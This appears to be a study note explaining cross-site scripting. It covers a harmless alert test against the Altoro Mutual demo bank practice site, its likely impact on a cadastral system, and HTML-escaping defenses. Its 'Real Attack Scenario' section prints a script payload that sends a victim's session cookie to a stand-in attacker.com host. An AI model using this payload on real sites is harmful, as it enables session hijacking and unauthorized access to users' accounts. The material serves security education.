# XSS — Cross-Site Scripting Analysis

## What is XSS?
XSS occurs when an attacker injects malicious JavaScript into a web page. When other users visit that page, the script executes in their browser without their knowledge.

**XSS = Cross-Site Scripting**
- Cross-Site — the malicious script travels from the attacked site to another user's browser
- Scripting — it is JavaScript code that executes automatically

## SQL Injection vs XSS

| | SQL Injection | XSS |
|--|--------------|-----|
| Target | Database | User's browser |
| Goal | Steal/modify data | Steal sessions, redirect users |
| Input | SQL code | JavaScript code |

## How it Works
A vulnerable site takes user input and displays it back without sanitization.

User writes in search field:
```html
<script>alert('XSS')</script>
```

Vulnerable site executes it as code instead of displaying it as text.

## Practical Demonstration

**Target:** Altoro Mutual Demo Bank (demo.testfire.net) — legal practice site

**Attack performed:**
- Field: Search box
- Input: `<script>alert('hackeado')</script>`
- Result: JavaScript alert executed in browser ✓ — XSS confirmed

## Real Attack Scenario
Instead of a harmless alert, an attacker would use:
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```
This sends the victim's session cookie to the attacker — granting full access without needing credentials.

## Impact on a Cadastral System
If a cadastral system search or comment field is vulnerable to XSS:
- Attacker steals session cookies of municipal officers
- Accesses the system as a legitimate user
- Views, modifies or deletes land registry records
- No password needed — session hijacking

## Defense — Output Sanitization
Convert special characters before displaying user input:

| Character | Safe version |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |

The browser sees plain text — never executes it as code.

## Key Insight
XSS does not attack the server directly — it attacks other users through the server. The attacker plants a trap and waits for victims to trigger it.
